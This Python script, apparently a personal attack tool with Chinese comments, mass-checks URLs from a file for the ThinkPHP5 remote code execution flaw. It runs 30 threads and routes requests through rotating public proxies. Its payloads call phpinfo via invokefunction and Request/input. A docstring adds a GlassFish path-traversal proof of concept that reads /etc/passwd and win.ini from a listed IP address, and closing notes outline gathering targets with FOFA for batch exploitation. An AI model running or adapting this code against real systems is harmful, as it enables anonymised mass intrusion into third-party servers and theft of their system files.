import requests
import base64
requests.packages.urllib3.disable_warnings()
import threading
from concurrent.futures import ThreadPoolExecutor       #导入线程池
import random
import time

# ---------- 代理池配置 ----------
PROXY_API = "https://proxy.scdn.io/api/get_proxy.php"
PROXY_COUNT = 10          # 一次性获取 10 个代理，用完再取新的
proxy_list = []           # 缓存代理列表

def fetch_proxies(count=PROXY_COUNT, protocol="http"):
    """从 API 获取代理列表"""
    try:
        params = {
            "protocol": protocol,
            "count": count
        }
        resp = requests.get(PROXY_API, params=params, timeout=10)
        if resp.status_code == 200:
            data = resp.json()
            if data.get("code") == 200 and "data" in data:
                proxies = data["data"].get("proxies", [])
                print(f"[*] 获取到 {len(proxies)} 个代理")
                return proxies
    except requests.exceptions.RequestException:
        return []

def get_proxy():
    """获取一个代理，如果列表为空则重新拉取"""
    global proxy_list
    if not proxy_list:
        proxy_list = fetch_proxies()
    return random.choice(proxy_list) if proxy_list else None

threadings=[]
# 新增请求头
headers = {"User-Agent": "Mozilla/5.0"}
def poc(url):
    texts=[
        r"/index.php?s=index/\\think\\app/invokefunction&function=phpinfo&vars[0]=1",       
        r"/index.php?s=index/\\think\\Request/input&filter=phpinfo&data=1"
    ]
    for text in texts:
        pocurl=url+text
        try:
            proxy = get_proxy()
            proxies = {"http": f"http://{proxy}", "https": f"https://{proxy}"} if proxy else None
            # 增加请求头
            resp = requests.get(pocurl, headers=headers, proxies=proxies, verify=False, timeout=5)
            if  resp.status_code == 200 and "phpinfo" in resp.text:
                print("thinkphp5漏洞存在----------",url)
                return 
        except Exception:
            pass
                    

if __name__ =="__main__":
    pool = ThreadPoolExecutor(max_workers=30)
    with open ("poc.txt","r",encoding="utf-8") as f:
        for url in f:
            url = url.strip()                     # 去掉换行空格
            pool.submit(poc,url)                           #submit()固定用法：往线程池里丢任务poc你写的 漏洞检测函数（就是你代码里 def poc (url): 这一堆）url要传给 poc 函数的 网址参数 
    pool.shutdown(wait=True)




"""
验证代码漏洞,glassfish示例

url="http://110.238.64.195:4848"
winsurl=url+"/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini"
linuxurl=url+"/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd"
#data_win=requests.get(winsurl,verify=False)
#data_linux=requests.get(linuxurl,verify=False)

data_win=requests.get(winsurl,verify=False).status_code
data_linux=requests.get(linuxurl,verify=False).status_code

if data_win == 200 or data_linux==200:
    print("glassfish漏洞存在")
else:
    print("没有查找到漏洞")


#print(data_win.text)
#print(data_linux.text)
"""




"""
如何实现漏洞批量化:
1.获取到存在漏洞的地址信息--fofa进行获取目标
    1.2将请求消息进行筛选--利用python lxml获取或者正则表达式的获取
2.批量请求地址信息进行判断是否存在--可用多线程
3.

"""


